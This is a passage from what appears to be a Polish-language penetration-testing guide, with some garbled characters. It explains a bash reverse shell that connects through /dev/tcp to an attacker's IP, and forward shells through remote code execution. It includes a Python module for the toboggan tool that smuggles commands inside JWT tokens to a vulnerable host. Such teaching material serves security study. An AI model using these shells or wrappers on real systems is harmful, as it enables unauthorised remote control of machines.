#### Wyjanienie powoki

1. **`bash -i`**: Ta cz polecenia uruchamia interaktywn (`-i`) powok Bash.
2. **`>&`**: Ta cz polecenia jest skr贸con notacj do **przekierowywania zar贸wno standardowego wyjcia** (`stdout`), jak i **standardowego bdu** (`stderr`) do **tego samego miejsca**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: To jest specjalny plik, kt贸ry **reprezentuje poczenie TCP z okrelonym adresem IP i portem**.
* Przez **przekierowywanie strumieni wyjcia i bdu do tego pliku**, polecenie skutecznie wysya wyjcie interaktywnej sesji powoki do maszyny atakujcego.
4. **`0>&1`**: Ta cz polecenia **przekierowuje standardowe wejcie (`stdin`) do tego samego miejsca co standardowe wyjcie (`stdout`)**.

## Forward Shell

Kiedy mamy do czynienia z luk **Remote Code Execution (RCE)** w aplikacji webowej opartej na Linuksie, uzyskanie reverse shell mo偶e by utrudnione przez zabezpieczenia sieciowe, takie jak reguy iptables lub skomplikowane mechanizmy filtrowania pakiet贸w. W takich ograniczonych rodowiskach alternatywnym podejciem jest nawizanie powoki PTY (Pseudo Terminal), aby skuteczniej interagowa z zainfekowanym systemem.

Zalecanym narzdziem do tego celu jest [toboggan](https://github.com/n3rada/toboggan.git), kt贸re upraszcza interakcj z docelowym rodowiskiem.

Aby skutecznie wykorzysta toboggan, stw贸rz modu Pythona dostosowany do kontekstu RCE twojego systemu docelowego. Na przykad, modu o nazwie `nix.py` m贸gby by skonstruowany w nastpujcy spos贸b:
```python3

import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
A nastpnie mo偶esz uruchomi:
```shell
toboggan -m nix.py -i
```
Aby bezporednio wykorzysta interaktywn powok. Mo偶esz doda `-b` dla integracji z Burpsuite i usun `-i` dla bardziej podstawowego opakowania rce.

Inn mo偶liwoci jest u偶ycie implementacji powoki forward `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).

Musisz tylko zmodyfikowa:

* URL podatnego hosta
* Prefiks i sufiks twojego adunku (jeli istnieje)
* Spos贸b wysyania adunku (nag贸wki? dane? dodatkowe informacje?)

Nastpnie mo偶esz po prostu **wysya polecenia** lub nawet **u偶y polecenia `upgrade`**, aby uzyska pene PTY (zauwa偶, 偶e potoki s odczytywane i zapisywane z op贸藕nieniem okoo 1,3 sekundy).
